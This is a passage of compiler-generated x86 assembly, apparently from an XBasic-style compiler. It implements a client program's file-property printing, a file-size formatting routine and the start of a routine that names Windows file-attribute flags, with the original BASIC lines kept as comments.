	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [920] CPrint ($$main,"\r\n--- properties: "+name)
	mov	eax,addr @_string.0237.client			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [921] CPrint ($$main,":attributes\t"+FileAttributeToName(XLONG(GetTokenEx(@info,32,0))))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	push	eax			;;; i667a
	call	func5F.client			;;; i619
	mov	ebx,addr @_string.0238.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [922] CPrint ($$main,":size\t\t"+FileSizeToName(GIANT(GetTokenEx(@info,32,0))))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.giant.s			;;; i492a
	add	esp,64			;;; i600
	push	edx
	push	eax			;;; i667a
	call	func61.client			;;; i619
	mov	ebx,addr @_string.0239.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [924] IF RIGHT$(name,1) == "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.0050.client			;;; i219
;
; [925] CPrint ($$main,":folders\t\t"+GetTokenEx(@info,32,0))
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	ebx,addr @_string.023A.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [926] CPrint ($$main,":files\t\t"+GetTokenEx(@info,32,0))
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	ebx,addr @_string.023B.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [927] END IF
else.0050.client:
end.if.0050.client:
;
; [929] filetimel = ULONG(GetTokenEx(@info,32,0))
#ifdef processFileInfo.filetimel
#undef processFileInfo.filetimel
#endif
#define processFileInfo.filetimel ebp-44	; exposes local variable 'filetimel'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [930] filetimeh = ULONG(GetTokenEx(@info,32,0))
#ifdef processFileInfo.filetimeh
#undef processFileInfo.filetimeh
#endif
#define processFileInfo.filetimeh ebp-48	; exposes local variable 'filetimeh'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-48],eax			;;; i670
;
; [931] CPrint ($$main,":created\t\t"+FileTimeToDateAndTime (filetimeh, filetimel))
	push	[ebp-44]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	func62.client			;;; i619
	mov	ebx,addr @_string.023E.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [933] filetimel = ULONG(GetTokenEx(@info,32,0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [934] filetimeh = ULONG(GetTokenEx(@info,32,0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-48],eax			;;; i670
;
; [935] CPrint ($$main,":modified\t\t"+FileTimeToDateAndTime (filetimeh, filetimel))
	push	[ebp-44]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	func62.client			;;; i619
	mov	ebx,addr @_string.023F.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [936] CPrint ($$main,"--- properties end")
	mov	eax,addr @_string.0240.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [938] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.processFileInfo.client:  ;;; Function end label for Assembly Programmers.
end.func5E.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5E.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func5E.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  processFileInfo ()  *****
;  *****
;
; [940] FUNCTION STRING FileSizeToName (GIANT fsize)
.code
;
#ifdef FileSizeToName.fsize
#undef FileSizeToName.fsize
#endif
#define FileSizeToName.fsize ebp+8	; exposes function argument 'fsize'
;
align 16
_FileSizeToName.client@8:
;  *****
;  *****  FUNCTION  FileSizeToName ()  *****
;  *****
func61.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func61.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody61.client:
;
; [941] STRING ntype
#ifdef FileSizeToName.ntype
#undef FileSizeToName.ntype
#endif
#define FileSizeToName.ntype ebp-40	; exposes local variable 'ntype'
;
;
; [942] SINGLE tsize
#ifdef FileSizeToName.tsize
#undef FileSizeToName.tsize
#endif
#define FileSizeToName.tsize ebp-44	; exposes local variable 'tsize'
;
;
; [945] SELECT CASE TRUE
;
; [946] CASE (fsize < 1024)			:tsize = fsize: ntype = "bytes"
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[ebp+12]
	mov	ebx,1024			;;; i659
	mov	ecx,ebx			;;; i406
	sar	ecx,31			;;; i407
	cmp	edx,ecx			;;; i685a
;>peep
	je	> A.167			;;; i700
	mov	eax,0
	jl	> A.168			;;; i701
	jmp	> A.169			;;; i702
A.167:
	cmp	eax,ebx			;;; i703
	mov	eax,0
	jae	> A.169			;;; i704
A.168:
	not	eax			;;; i705
A.169:
;+peep
	test	eax,eax			;;; i220
	jz	>> case.0051.0001.client			;;; i221
	fild	q[ebp+8]			;;; i643a
	fstp	d[ebp-44]			;;; i645
	mov	eax,addr @_string.0244.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [947] CASE (fsize < (1024**2))	:tsize = ((fsize+ 0.5) / 1024.0): ntype = "kb"
	jmp	end.select.0051.client			;;; i69
case.0051.0001.client:
	mov	eax,1024			;;; i659
	mov	ebx,2
	call	%_power.slong			;;; i834
	mov	edx,eax			;;; i406
	sar	edx,31			;;; i407
	mov	ebx,d[ebp+8]			;;; i665
	mov	ecx,d[ebp+12]
	cmp	edx,ecx			;;; i685a
;>peep
	je	> A.170			;;; i700
	mov	eax,0
	jg	> A.171			;;; i701
	jmp	> A.172			;;; i702
A.170:
	cmp	eax,ebx			;;; i703
	mov	eax,0
	jbe	> A.172			;;; i704
A.171:
	not	eax			;;; i705
A.172:
;+peep
	test	eax,eax			;;; i220
	jz	>> case.0051.0002.client			;;; i221
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[ebp+12]
	mov	d[ebp-8],eax			;;; i394
	mov	d[ebp-4],edx			;;; i395
	fild	q[ebp-8]			;;; i396
	push	1056964608			;;; i654
	fld	d[esp]			;;; i655
	add	esp,4			;;; i656
	fadd				;;; i841
	push	1149239296			;;; i654
	fld	d[esp]			;;; i655
	add	esp,4			;;; i656
	fdiv				;;; i841
	fstp	d[ebp-44]			;;; i669
	mov	eax,addr @_string.0247.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [948] CASE (fsize < (1024**3))	:tsize = ((fsize+ 0.5) / (1024.0**2)): ntype = "mb"
	jmp	end.select.0051.client			;;; i69
case.0051.0002.client:
	mov	eax,1024			;;; i659
	mov	ebx,3
	call	%_power.slong			;;; i834
	mov	edx,eax			;;; i406
	sar	edx,31			;;; i407
	mov	ebx,d[ebp+8]			;;; i665
	mov	ecx,d[ebp+12]
	cmp	edx,ecx			;;; i685a
;>peep
	je	> A.173			;;; i700
	mov	eax,0
	jg	> A.174			;;; i701
	jmp	> A.175			;;; i702
A.173:
	cmp	eax,ebx			;;; i703
	mov	eax,0
	jbe	> A.175			;;; i704
A.174:
	not	eax			;;; i705
A.175:
;+peep
	test	eax,eax			;;; i220
	jz	>> case.0051.0003.client			;;; i221
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[ebp+12]
	mov	d[ebp-8],eax			;;; i394
	mov	d[ebp-4],edx			;;; i395
	fild	q[ebp-8]			;;; i396
	push	1056964608			;;; i654
	fld	d[esp]			;;; i655
	add	esp,4			;;; i656
	fadd				;;; i841
; .xstk61.0000 = ebp-52	; internal variable
	push	1149239296			;;; i654
	fld	d[esp]			;;; i655
	add	esp,4			;;; i656
	mov	ebx,2			;;; i659
	mov	d[ebp-8],ebx			;;; i389
	fild	d[ebp-8]			;;; i390
	call	%_power.single			;;; i834
	fdiv				;;; i841
	fstp	d[ebp-44]			;;; i669
	mov	eax,addr @_string.0248.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [949] CASE (fsize >= (1024**3))	:tsize = ((fsize+ 0.5) / (1024.0**3)): ntype = "gb"
	jmp	end.select.0051.client			;;; i69
case.0051.0003.client:
	mov	eax,1024			;;; i659
	mov	ebx,3
	call	%_power.slong			;;; i834
	mov	edx,eax			;;; i406
	sar	edx,31			;;; i407
	mov	ebx,d[ebp+8]			;;; i665
	mov	ecx,d[ebp+12]
	cmp	edx,ecx			;;; i685a
;>peep
	je	> A.176			;;; i714
	mov	eax,0
	jle	> A.177			;;; i715
	jmp	> A.178			;;; i716
A.176:
	cmp	eax,ebx			;;; i717
	mov	eax,0
	ja	> A.178			;;; i718
A.177:
	not	eax			;;; i719
A.178:
;+peep
	test	eax,eax			;;; i220
	jz	>> case.0051.0004.client			;;; i221
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[ebp+12]
	mov	d[ebp-8],eax			;;; i394
	mov	d[ebp-4],edx			;;; i395
	fild	q[ebp-8]			;;; i396
	push	1056964608			;;; i654
	fld	d[esp]			;;; i655
	add	esp,4			;;; i656
	fadd				;;; i841
	push	1149239296			;;; i654
	fld	d[esp]			;;; i655
	add	esp,4			;;; i656
	mov	ebx,3			;;; i659
	mov	d[ebp-8],ebx			;;; i389
	fild	d[ebp-8]			;;; i390
	call	%_power.single			;;; i834
	fdiv				;;; i841
	fstp	d[ebp-44]			;;; i669
	mov	eax,addr @_string.0249.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [950] END SELECT
case.0051.0004.client:
end.select.0051.client:
;
; [952] 'FORMAT$("###.##",tsize) ' there's a bug with FORMAT$()
;
; [953] RETURN STRING$(tsize)+" "+ntype
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.single			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	jmp	end.func61.client			;;; i258
;
; [954] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.FileSizeToName.client:  ;;; Function end label for Assembly Programmers.
end.func61.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func61.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func61.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  FileSizeToName ()  *****
;  *****
;
; [956] FUNCTION STRING FileAttributeToName (a)
.code
;
#ifdef FileAttributeToName.a
#undef FileAttributeToName.a
#endif
#define FileAttributeToName.a ebp+8	; exposes function argument 'a'
;
align 16
_FileAttributeToName.client@4:
;  *****
;  *****  FUNCTION  FileAttributeToName ()  *****
;  *****
func5F.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5F.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody5F.client:
;
; [957] STRING name
#ifdef FileAttributeToName.name
#undef FileAttributeToName.name
#endif
#define FileAttributeToName.name ebp-40	; exposes local variable 'name'
;
;
; [959] name = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [960] SELECT CASE ALL TRUE
;
; [961] CASE (a & $$FILE_ATTRIBUTE_READONLY)	 :name = "Read Only"
	mov	eax,d[ebp+8]			;;; i665
	and	eax,1			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0001.client			;;; i221
	mov	eax,addr @_string.024D.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [962] CASE (a & $$FILE_ATTRIBUTE_HIDDEN)		 :name = attributeCheck(name) + "Hidden"
case.0052.0001.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,2			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0002.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.024F.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [963] CASE (a & $$FILE_ATTRIBUTE_SYSTEM)		 :name = attributeCheck(name) + "System"
case.0052.0002.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,4			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0003.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0251.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [964] CASE (a & $$FILE_ATTRIBUTE_DIRECTORY)	 :name = attributeCheck(name) + "Directory"
case.0052.0003.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,16			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0004.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0253.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [965] CASE (a & $$FILE_ATTRIBUTE_ARCHIVE)		 :name = attributeCheck(name) + "Archive"
case.0052.0004.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,32			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0005.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0255.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [966] CASE (a & $$FILE_ATTRIBUTE_NORMAL)		 :name = attributeCheck(name) + "Normal"
case.0052.0005.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,128			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0006.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0257.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [967] CASE (a & $$FILE_ATTRIBUTE_TEMPORARY)	 :name = attributeCheck(name) + "Temporary"
case.0052.0006.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,256			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0007.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0259.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [968] CASE (a & $$FILE_ATTRIBUTE_ATOMIC_WRITE) :name = attributeCheck(name) + "Atomic Write"
case.0052.0007.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,512			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0008.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.025B.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [969] CASE (a & $$FILE_ATTRIBUTE_XACTION_WRITE):name = attributeCheck(name) + "XAction Write"
case.0052.0008.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,1024			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.0009.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.025D.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [970] CASE (a & $$FILE_ATTRIBUTE_COMPRESSED)	 :name = attributeCheck(name) + "Compressed"
case.0052.0009.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,2048			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.000A.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.025F.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [971] CASE (a & $$FILE_ATTRIBUTE_SPARSE_FILE)	 :name = attributeCheck(name) + "Sparse File"
case.0052.000A.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,512			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.000B.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0260.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [972] CASE (a & $$FILE_ATTRIBUTE_REPARSE_POINT):name = attributeCheck(name) + "Reparse Point"
case.0052.000B.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,1024			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.000C.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0261.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [973] CASE (a & $$FILE_ATTRIBUTE_ENCRYPTED)	 :name = attributeCheck(name) + "Encrypted"
case.0052.000C.client:
	mov	eax,d[ebp+8]			;;; i665
	and	eax,16384			;;; i769
	test	eax,eax			;;; i220
	jz	>> case.0052.000D.client			;;; i221
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func60.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	ebx,addr @_string.0262.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
